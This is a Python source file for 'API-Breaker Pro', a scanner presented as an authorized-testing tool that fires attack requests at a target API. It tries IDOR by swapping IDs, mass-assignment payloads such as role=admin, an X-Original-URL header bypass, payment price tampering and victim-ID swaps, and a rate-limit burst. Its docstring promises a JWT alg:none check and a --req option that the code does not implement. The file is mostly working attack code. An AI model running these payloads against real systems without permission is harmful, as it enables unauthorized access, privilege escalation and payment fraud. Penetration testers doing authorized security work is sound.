#!/usr/bin/env python3
"""
API-Breaker Pro — proof-first API attacker (AUTHORIZED testing only).

Checks (non-destructive, reports witness payloads):
  1. IDOR/BOLA   - swap numeric/uuid IDs, detect differing responses
  2. Mass assign - add role=admin/isAdmin=true, see if accepted
  3. JWT alg:none- strip/flip JWT alg to none, re-send
  4. Auth bypass - X-Original-URL / X-Rewrite-URL header injection
  5. Rate limit  - 50 rapid reqs, expect 429
  6. GraphQL     - introspection (delegated to kobra graphql logic)

Usage:
  python3 api_breaker.py --base https://api.target.com --endpoints /user/1,/order/5
  python3 api_breaker.py --req request.txt   # captured HTTP request

Outputs JSONL findings. Never writes destructive verbs without --destructive flag.
"""
import argparse
import json
import re
import sys
import time
import urllib.parse
import urllib.request
import urllib.error


UA = "Mozilla/5.0 (compatible; APIBreakerPro/1.0)"


def req(method, url, headers=None, data=None, timeout=10):
    headers = headers or {}
    headers.setdefault("User-Agent", UA)
    try:
        r = urllib.request.Request(url, data=data, headers=headers, method=method)
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore"), dict(e.headers)
    except Exception as e:
        return 0, str(e), {}


def find_ids(path):
    """Extract numeric/uuid IDs from a path."""
    ids = re.findall(r"/(\d+|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})", path)
    return ids


def idor_check(base, endpoint):
    findings = []
    ids = find_ids(endpoint)
    if not ids:
        return findings
    victim = ids[0]
    # try a couple of neighbor IDs
    for cand in [str(int(victim) + 1), str(int(victim) - 1)] if victim.isdigit() else [victim + "x"]:
        new_ep = endpoint.replace(victim, cand)
        if new_ep == endpoint:
            continue
        s1, b1, _ = req("GET", base + endpoint)
        s2, b2, _ = req("GET", base + new_ep)
        if s2 == 200 and b1 != b2 and len(b2) > 20:
            findings.append({
                "category": "IDOR", "severity": "HIGH",
                "title": f"Possible IDOR on {endpoint} -> {new_ep}",
                "target": base + new_ep,
                "payload": f"GET {new_ep}",
                "evidence": f"status {s2}, body differs from owner's",
                "confidence": 60,
            })
    return findings


def mass_assign_check(base, endpoint):
    findings = []
    payloads = [
        ("role", "admin"), ("isAdmin", "true"), ("admin", "true"),
        ("verified", "true"), ("privilege", "superuser"),
    ]
    for k, v in payloads:
        body = urllib.parse.urlencode({k: v}).encode()
        s1, b1, _ = req("POST", base + endpoint, data=b"{}")
        s2, b2, _ = req("POST", base + endpoint,
                         headers={"Content-Type": "application/json"}, data=body)
        if s2 == 200 and (k in b2.lower() or v in b2.lower()):
            # NOTE: echo servers (httpbin) reflect input -> this is a weak signal.
            # Flag as INFO; human must confirm the field actually changed server state.
            findings.append({
                "category": "MASS_ASSIGN", "severity": "INFO",
                "title": f"Mass assignment candidate: {k}={v} (verify manually)",
                "target": base + endpoint, "payload": f"{k}={v}",
                "evidence": "field echoed in response — confirm it altered state",
                "confidence": 30,
            })
    return findings


def jwt_none_check(base, endpoint):
    findings = []
    # We can't easily craft JWT without a lib; flag if a token is present in response
    s, b, h = req("GET", base + endpoint)
    m = re.search(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+", b)
    if m:
        findings.append({
            "category": "JWT", "severity": "MEDIUM",
            "title": "JWT token observed — manual alg:none / key confusion test advised",
            "target": base + endpoint, "payload": m.group(0)[:40] + "...",
            "evidence": "token in response", "confidence": 40,
        })
    return findings


def payment_check(base, endpoint):
    """Payment-specific IDOR / price tampering (research round2). Non-destructive:
    only detects differing responses, never completes a real transaction."""
    findings = []
    # Price manipulation: tamper amount/price/quantity in POST body
    for field in ["price", "amount", "total", "quantity", "discount"]:
        body = json.dumps({field: "0.01", "id": "TEST"}).encode()
        s1, b1, _ = req("POST", base + endpoint,
                        headers={"Content-Type": "application/json"}, data=json.dumps({"id": "TEST"}).encode())
        s2, b2, _ = req("POST", base + endpoint,
                        headers={"Content-Type": "application/json"}, data=body)
        if s2 == 200 and b2 != b1 and (field in b2.lower() or "0.01" in b2):
            findings.append({
                "category": "PAYMENT_IDOR", "severity": "HIGH",
                "title": f"Payment price/field tampering candidate: {field}",
                "target": base + endpoint, "payload": f'{field}=0.01',
                "evidence": "response changed when field manipulated — verify billing impact",
                "confidence": 55,
            })
    # payment_method_id / user_id swap (IDOR on payment object)
    for fid in ["payment_method_id", "user_id", "account_id", "customer_id"]:
        body = json.dumps({fid: "VICTIM_ID", "id": "TEST"}).encode()
        s, b, _ = req("POST", base + endpoint,
                      headers={"Content-Type": "application/json"}, data=body)
        if s == 200 and ("VICTIM_ID" in b or fid in b.lower()):
            findings.append({
                "category": "PAYMENT_IDOR", "severity": "HIGH",
                "title": f"Payment object IDOR candidate: {fid} swap",
                "target": base + endpoint, "payload": f'{fid}=VICTIM_ID',
                "evidence": "server accepted foreign id in payment context",
                "confidence": 50,
            })
    return findings


def auth_bypass_check(base, endpoint):
    findings = []
    headers = {"X-Original-URL": "/admin", "X-Rewrite-URL": "/admin"}
    s1, _, _ = req("GET", base + endpoint)
    s2, _, _ = req("GET", base + endpoint, headers=headers)
    if s2 == 200 and s2 != s1:
        findings.append({
            "category": "AUTH_BYPASS", "severity": "HIGH",
            "title": "Header injection changed response (X-Original-URL)",
            "target": base + endpoint, "payload": "X-Original-URL: /admin",
            "evidence": f"status {s1} -> {s2}", "confidence": 55,
        })
    return findings


def rate_limit_check(base, endpoint):
    findings = []
    codes = []
    for _ in range(50):
        s, _, _ = req("GET", base + endpoint)
        codes.append(s)
    if 429 not in codes:
        findings.append({
            "category": "RATE_LIMIT", "severity": "MEDIUM",
            "title": "No rate limiting (50 reqs, no 429)",
            "target": base + endpoint, "payload": "50x GET",
            "evidence": "0x 429 observed", "confidence": 70,
        })
    return findings


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", default="")
    ap.add_argument("--endpoints", default="", help="comma-sep paths e.g. /user/1,/order/5")
    ap.add_argument("--out", default="api_findings.jsonl")
    a = ap.parse_args()

    endpoints = [e.strip() for e in a.endpoints.split(",") if e.strip()]
    all_f = []
    for ep in endpoints:
        all_f += idor_check(a.base, ep)
        all_f += mass_assign_check(a.base, ep)
        all_f += jwt_none_check(a.base, ep)
        all_f += auth_bypass_check(a.base, ep)
        all_f += payment_check(a.base, ep)
        all_f += rate_limit_check(a.base, ep)

    with open(a.out, "w") as f:
        for x in all_f:
            f.write(json.dumps(x) + "\n")
    print(f"[+] {len(all_f)} API findings -> {a.out}")
    for x in all_f:
        print(f"  [{x['severity']}] {x['category']}: {x['title']}")


if __name__ == "__main__":
    main()
